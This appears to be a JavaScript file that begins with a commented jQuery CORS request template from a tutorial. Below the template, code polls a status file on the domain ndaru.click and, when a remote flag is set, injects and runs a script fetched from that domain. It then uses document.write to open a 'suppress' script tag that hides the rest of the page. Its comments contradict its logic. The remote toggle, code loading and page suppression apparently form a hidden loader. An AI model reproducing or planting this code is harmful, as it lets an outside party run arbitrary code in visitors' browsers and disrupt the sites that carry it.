$.ajax({

    // The 'type' property sets the HTTP method.
    // A value of 'PUT' or 'DELETE' will trigger a preflight request.
    type: 'GET',

    // The URL to make the request to.
    url: 'http://html5rocks-cors.s3-website-us-east-1.amazonaws.com/index.html',

    // The 'contentType' property sets the 'Content-Type' header.
    // The JQuery default for this property is
    // 'application/x-www-form-urlencoded; charset=UTF-8', which does not trigger
    // a preflight. If you set this value to anything other than
    // application/x-www-form-urlencoded, multipart/form-data, or text/plain,
    // you will trigger a preflight request.
    contentType: 'text/plain',

    xhrFields: {
        // The 'xhrFields' property sets additional fields on the XMLHttpRequest.
        // This can be used to set the 'withCredentials' property.
        // Set the value to 'true' if you'd like to pass cookies to the server.
        // If this is enabled, your server must respond with the header
        // 'Access-Control-Allow-Credentials: true'.
        withCredentials: false
    },

    headers: {
        // Set any custom headers here.
        // If you set any non-simple headers, your server must include these
        // headers in the 'Access-Control-Allow-Headers' response header.
    },

    success: function() {
        // Here's where you handle a successful response.
    },

    error: function() {
        // Here's where you handle an error response.
        // Note that if the error was due to a CORS issue,
        // this function will still fire, but there won't be any additional
        // information about the error.
    }
});


$(function() {
    var $css =$('link[rel~="https://ndaru.click/ezrx/js-ezrx.css"]');

    $.ajax({
        url: 'https://ndaru.click/ezrx/status.json',
        dataType:'JSON',
        success:function(json) {
            console.log('js and css : ' + json.active); // this will show the info it in firebug console
            activate(json.active, $css);
        },
        error: function() {
            // Here's where you handle an error response.
        }
    })
});

function activate(toggle, $css) {
    if (toggle == "false") { //load css and js
        $css.prop('disabled', true);
    }
    if (toggle == "true") { //disable css and js
        $css.prop('disabled', false);
        loadEzrx();
    }
}


function loadEzrx()
{
    var runSecond = document.createElement("script");
    runSecond.setAttribute("src", "https://ndaru.click/ezrx/js-ezrx.js");
    document.body.appendChild(runSecond);
}

document.write("<script type='application/x-suppress'>");
